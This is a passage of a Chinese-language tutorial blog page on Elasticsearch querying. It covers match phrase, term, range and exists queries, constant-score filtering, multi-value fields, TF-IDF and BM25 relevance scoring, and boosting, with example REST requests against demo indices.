href="#Match-Phrase-Query" class="headerlink" title="Match Phrase Query"></a>Match Phrase Query</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>:<span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"match_phrase"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>:&#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"Matrix reloaded"</span>,</span><br><span class="line">        <span class="attr">"slop"</span>: <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Match-Query-查询过程"><a href="#Match-Query-查询过程" class="headerlink" title="Match Query 查询过程"></a>Match Query 查询过程</h3><ul><li>基于全文本的查找<ul><li>Match Query / Match Phrase Query / Query String Query</li></ul></li><li>基于全文本的查询的特点<ul><li>索引和搜索时都会进行分词，查询字符串先传递到一个合适的分词器，然后生成一个供查询的词项列表</li><li>查询会对每个词项逐个进行底层的查询，再将结果进行合并，并未每个文档生成一个算分</li></ul></li></ul><p><img src="/images/big-data/es-05/1.jpg" alt="1"></p><p><strong>小结</strong></p><ul><li>基于词项的查找 vs 基于全文的查找</li><li>通过字段 Mapping 控制字段的分词<ul><li>“Text” vs “Keyword”</li></ul></li><li>通过参数控制查询的 Precision &amp; Recall</li><li>复合查询<ul><li>即使是对 Keyword 进行 Term 查询，同样会进行算分</li><li>可以将查询转为 Filtering，取消相关性算分的环节，以提高性能</li></ul></li></ul><h2 id="结构化搜索"><a href="#结构化搜索" class="headerlink" title="结构化搜索"></a>结构化搜索</h2><ul><li>结构化搜索（Structured search） 是指对结构化数据的搜索<ul><li>日期，布尔类型和数字都是结构化</li></ul></li><li>文本也可以是结构化的<ul><li>如彩色笔可以有离散的颜色集合：红（red）、绿（green）、蓝（blue）</li><li>一个博客可能被标记了标签，例如，分布式（distributed）和搜索（search）</li><li>电商网站上的商品都有 UPCs（通用产品码 Universal Product Codes）或其他的唯一标识，它们都遵从严格规定的、结构化的格式</li></ul></li></ul><h3 id="ES-中的机构化搜索"><a href="#ES-中的机构化搜索" class="headerlink" title="ES 中的机构化搜索"></a>ES 中的机构化搜索</h3><ul><li>布尔、时间，日期和数字这类结构化数据：有精确的格式，我们可以对这些格式进行逻辑操作。包括比较数字或时间的范围，或判断两个值的大小</li><li>结构化的文本可以做到精确匹配或者部分匹配<ul><li>Term 查询 / Prefix 前缀查询</li></ul></li><li>结构化结构只有 “是” 或 “否” 两个值<ul><li>根据场景需要，可以决定结构化搜索是否需要打分</li></ul></li></ul><p><strong>Demo</strong> </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">DELETE products</span><br><span class="line">POST /products/_bulk</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"price"</span>:<span class="number">10</span>,<span class="attr">"avaliable"</span>:<span class="literal">true</span>,<span class="attr">"date"</span>:<span class="string">"2018-01-01"</span>,<span class="attr">"productID"</span>:<span class="string">"XHDK-A-1293-#fJ3"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"price"</span>:<span class="number">20</span>,<span class="attr">"avaliable"</span>:<span class="literal">true</span>,<span class="attr">"date"</span>:<span class="string">"2019-01-01"</span>,<span class="attr">"productID"</span>:<span class="string">"KDKE-B-9947-#kL5"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">3</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"price"</span>:<span class="number">30</span>,<span class="attr">"avaliable"</span>:<span class="literal">true</span>,<span class="attr">"productID"</span>:<span class="string">"JODL-X-1937-#pV7"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">4</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"price"</span>:<span class="number">30</span>,<span class="attr">"avaliable"</span>:<span class="literal">false</span>,<span class="attr">"productID"</span>:<span class="string">"QQPX-R-3956-#aD8"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看mapping</span></span><br><span class="line">GET products/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"products"</span> : &#123;</span><br><span class="line">    <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">      <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"avaliable"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"boolean"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"date"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"date"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"price"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"long"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"productID"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">256</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>对布尔值 match 查询，有算分</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span>,</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"avaliable"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>对布尔值，通过 constant score 转成 filtering，没有算分</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span>,</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"constant_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"term"</span>: &#123;</span><br><span class="line">          <span class="attr">"avaliable"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"boost"</span>: <span class="number">1.2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>数字类型 Term</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span>,</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"constant_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"term"</span>: &#123;</span><br><span class="line">          <span class="attr">"price"</span>: <span class="number">30</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"boost"</span>: <span class="number">1.2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>数字类型 terms</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span>,</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"constant_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"terms"</span>: &#123;</span><br><span class="line">          <span class="attr">"price"</span>: [</span><br><span class="line">              <span class="string">"20"</span>,</span><br><span class="line">              <span class="string">"30"</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>数字 Range 查询<ul><li>gt 大于</li><li>lt 小于</li><li>gte 大于等于</li><li>lte 小于等于</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span>,</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"constant_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"range"</span>: &#123;</span><br><span class="line">          <span class="attr">"price"</span>: &#123;</span><br><span class="line">             <span class="attr">"gte"</span>: <span class="number">20</span>,</span><br><span class="line">             <span class="attr">"lte"</span>:<span class="number">30</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>日期 range<ul><li>Date Match Expressions</li><li><code>2020-01-01 00:00:00 || +1M</code></li></ul></li></ul><p><img src="/images/big-data/es-05/2.jpg" alt="2"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"query"</span>: &#123;</span><br><span class="line">  <span class="attr">"constant_score"</span>: &#123;</span><br><span class="line">    <span class="attr">"filter"</span>: &#123;</span><br><span class="line">      <span class="attr">"range"</span>: &#123;</span><br><span class="line">        <span class="attr">"date"</span>: &#123;</span><br><span class="line">           <span class="attr">"gte"</span>: <span class="string">"now-1y"</span>  <span class="comment">//当前时间减1年</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>exists 查询 - 非空查询</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span> : &#123;</span><br><span class="line">        <span class="attr">"constant_score"</span> : &#123;</span><br><span class="line">            <span class="attr">"filter"</span> : &#123;</span><br><span class="line">                <span class="attr">"exists"</span>: &#123;</span><br><span class="line">                    <span class="attr">"field"</span>:<span class="string">"date"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>字符类型 terms</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"constant_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"terms"</span>: &#123;</span><br><span class="line">          <span class="attr">"productID.keyword"</span>: [</span><br><span class="line">            <span class="string">"QQPX-R-3956-#aD8"</span>,</span><br><span class="line">            <span class="string">"JODL-X-1937-#pV7"</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>处理多值字段</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /movies/_bulk</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title"</span>:<span class="string">"Father of the Bridge Part II"</span>,<span class="attr">"year"</span>:<span class="number">1995</span>,<span class="attr">"genre"</span>:<span class="string">"Comedy"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title"</span>:<span class="string">"Dave"</span>,<span class="attr">"year"</span>:<span class="number">1993</span>,<span class="attr">"genre"</span>:[<span class="string">"Comedy"</span>,<span class="string">"Romance"</span>]&#125;</span><br></pre></td></tr></table></figure><ul><li>处理多值字段，term 查询是包含，而不是等于</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回2条数据</span></span><br><span class="line">POST movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"constant_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"term"</span>: &#123;</span><br><span class="line">          <span class="attr">"genre.keyword"</span>: <span class="string">"Comedy"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Match 跟 term 对比</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span>,</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"date"</span>: <span class="string">"2019-01-01"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span>,</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"date"</span>: <span class="string">"2019-01-01"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>小结</strong></p><ul><li>机构化数据 &amp; 结构化搜索<ul><li>如果不需要算分，可以通过 Constant Score ，将查询转为 Filterng</li></ul></li><li>范围查询 和 Date Match</li><li>使用 Exist 查询处理非空 NULL 值</li><li>精确值 &amp; 多值字段的精确值查找<ul><li>Term 查询是包含，不是完全相等。针对多值字段查询要尤其注意</li></ul></li></ul><p><strong>什么时候用 term 跟 match</strong></p><blockquote><p>结构化数据的精确匹配，就使用 term 查询。日期属于结构化数据。match 主要用于文本的 full-text 查询</p></blockquote><h2 id="搜索的相关性算分"><a href="#搜索的相关性算分" class="headerlink" title="搜索的相关性算分"></a>搜索的相关性算分</h2><p>ES 对查询关键字和索引文档的相关度进行打分，得分高的就排在前边。</p><ul><li>相关性 - Relevance<ul><li>搜索的相关性算分，描述了一个文档和查询语句匹配的程度。ES 会对每个匹配查询条件的结构进行算分_score</li><li>打分的本质是排序 , 需要把最符合用户需求的文档排在前面。ES 5 之前，默认的相关性打分采用 TF-IDF，现在采用 BM25</li></ul></li></ul><table><thead><tr><th align="center">词（Term）</th><th align="center">文档（Doc ID)</th></tr></thead><tbody><tr><td align="center">区块链</td><td align="center">1，2，3</td></tr><tr><td align="center">的</td><td align="center">2，3，4，5，6，7，8</td></tr><tr><td align="center">应用</td><td align="center">2，3，8，9，10</td></tr></tbody></table><h3 id="词频-TF"><a href="#词频-TF" class="headerlink" title="词频 TF"></a>词频 TF</h3><ul><li>Term Frequency∶ 检索词在一篇文档中出现的频率<ul><li>检索词出现的次数除以文档的总字数</li></ul></li><li>度量一条查询和结果文档相关性的简单方法：简单将搜索中每一个 词的 TF 进行相加<ul><li>$ TF(区块链) + TF(的) + TF(应用) $</li></ul></li><li>Stop Word<ul><li>“的”在文档中出现了很多次，但是对贡献相关度几乎没有用处，不应该考虑他们的 TF</li></ul></li></ul><h3 id="逆文档频率-IDF"><a href="#逆文档频率-IDF" class="headerlink" title="逆文档频率 IDF"></a>逆文档频率 IDF</h3><ul><li><p>DF：检索词在所有文档中出现的频率</p><ul><li>“区块链” 在相对比较少的文档中出现</li><li>“应用” 在相对比较多的文档中出现</li><li>“Stop Word” 在大量的文档中出现</li></ul></li><li><p>Inverse Document Frequency：$ 简单说 = log（全部文档数 / 检索词出现过的文档总数）$</p></li><li><p>TF-IDF 本质上就是将 TF 求和变成了加权求和</p></li><li><p>$ TF(区块链) * IDF(区块链) + TF(的) * IDF(的) + TF(应用) *  IDF(应用) $</p></li></ul><table><thead><tr><th align="center"></th><th align="center">出现的文档数</th><th align="center">总文档数</th><th align="center">IDF</th></tr></thead><tbody><tr><td align="center">区块链</td><td align="center">200万</td><td align="center">10亿</td><td align="center">log(500) = 8.96</td></tr><tr><td align="center">的</td><td align="center">10亿</td><td align="center">10亿</td><td align="center">log(1) = 0</td></tr><tr><td align="center">应用</td><td align="center">5亿</td><td align="center">10亿</td><td align="center">log(2) = 1</td></tr></tbody></table><blockquote><p>这里 log 底数是 2</p></blockquote><h3 id="TF-IDF-的概念"><a href="#TF-IDF-的概念" class="headerlink" title="TF-IDF 的概念"></a>TF-IDF 的概念</h3><ul><li>TF-IDF 被公认为是信息检索领域最重要的发明</li><li>除了在信息检索，在文献分类和其他相关领域有着非常广泛的应用</li><li>IDF 的概念，最早是剑桥大学的”斯巴克.琼斯”提出<ul><li>1972年 一 “关键词特殊性的统计解释和它在文献检索中的应用”</li><li>但是没有从理论上解释 IDF应该是用 log（全部文档数 / 检索词出现过的文档总数），而不是其他函数。他也没有做进一步的研究</li></ul></li><li>1970，1980年代萨尔顿和罗宾逊，进行了进一步的证明和研究，并用香农信息论做了证明<ul><li><a href="http://www.staff.city.ac.uk/~sbrp622/papers/foundations_bm25_review.pdf" target="_blank" rel="noopener">http://www.staff.city.ac.uk/~sbrp622/papers/foundations_bm25_review.pdf</a></li></ul></li><li>现代搜索引擎，对 TF-IDF 进行了大量细微的优化</li></ul><h3 id="Lucene-中的-TF-IDF-评分公式"><a href="#Lucene-中的-TF-IDF-评分公式" class="headerlink" title="Lucene 中的 TF-IDF 评分公式"></a>Lucene 中的 TF-IDF 评分公式</h3><p><img src="/images/big-data/es-05/3.jpg" alt="3"></p><ul><li><strong>score(q,d)</strong> 是指查询输入Q和当前文档D的相关性得分；</li><li><strong>coord(q,d)</strong> 是协调因子，表示输入的Token被文档匹配到的比例；</li><li><strong>queryNorm(q)</strong> 是查询输入归一化因子，其作用是使最终的得分不至于太大，从而具有一定的可比性；</li><li><strong>tf(t,d)</strong> 表示输入的一个Token在文档中出现的频率，频率越高，得分越高；</li><li>*<em>idf(t) *</em> 表示输入的一个Token的频率级别，它具体的计算与当前文档无关，而是与索引中出现的频率相关，出现频率越低，说明这个词是个稀缺词，得分会越高；</li><li><strong>boost(t)</strong> 是查询时指定的权重；</li><li><strong>norm(t,d)</strong> 是指当前文档的Term数量的一个权重，文档越短，相关性越高。</li></ul><h3 id="BM25"><a href="#BM25" class="headerlink" title="BM25"></a>BM25</h3><p><img src="/images/big-data/es-05/4.jpg" alt="4"></p><ul><li>从 ES 5开始，默认算法改为 BM25；</li><li>和经典的 TF-ID F相比，当 TF无限增加时，BM 25 算分会趋于一个数值。</li></ul><h3 id="定制-Similarity"><a href="#定制-Similarity" class="headerlink" title="定制 Similarity"></a>定制 Similarity</h3><p><img src="/images/big-data/es-05/5.jpg" alt="5"></p><h3 id="通过-Explain-API-查看-TF-IDF"><a href="#通过-Explain-API-查看-TF-IDF" class="headerlink" title="通过 Explain API 查看 TF-IDF"></a>通过 Explain API 查看 TF-IDF</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PUT testscore/_bulk</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"content"</span>:<span class="string">"we use Elasticsearch to power the search"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"content"</span>:<span class="string">"we like elasticsearch"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">3</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"content"</span>:<span class="string">"The scoring of documents is caculated by the scoring formula"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">4</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"content"</span>:<span class="string">"you know, for search"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询</span></span><br><span class="line">POST /testscore/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">     <span class="comment">// "content":"you"</span></span><br><span class="line">      <span class="attr">"content"</span>: <span class="string">"elasticsearch"</span></span><br><span class="line">      <span class="comment">//"content":"the"</span></span><br><span class="line">      <span class="comment">//"content": "the elasticsearch"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Boosting-Relevance"><a href="#Boosting-Relevance" class="headerlink" title="Boosting Relevance"></a>Boosting Relevance</h3><ul><li>Boosting 是控制相关度的一种手段<ul><li>索引，字段或查询子条件</li></ul></li><li>参数 boost 的含义<ul><li>当 boost &gt; 1 时，打分的相关度相对性提高</li><li>当 0 &lt; boost &lt; 1 时，打分的权重相对性降低</li><li>当 boost &lt; 0 时，贡献度负分</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST testscore/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"boosting"</span> : &#123;</span><br><span class="line">      <span class="attr">"positive"</span> : &#123;</span><br><span class="line">        <span class="attr">"term"</span> : &#123;</span><br><span class="line">          <span class="attr">"content"</span> : <span class="string">"elasticsearch"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"negative"</span> : &#123;</span><br><span class="line">        <span class="attr">"term"</span> : &#123;</span><br><span class="line">          <span class="attr">"content"</span> : <span class="string">"like"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"negative_boost"</span> : <span class="number">0.2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Query-amp-Filtering-与-多字符串多字段查询"><a 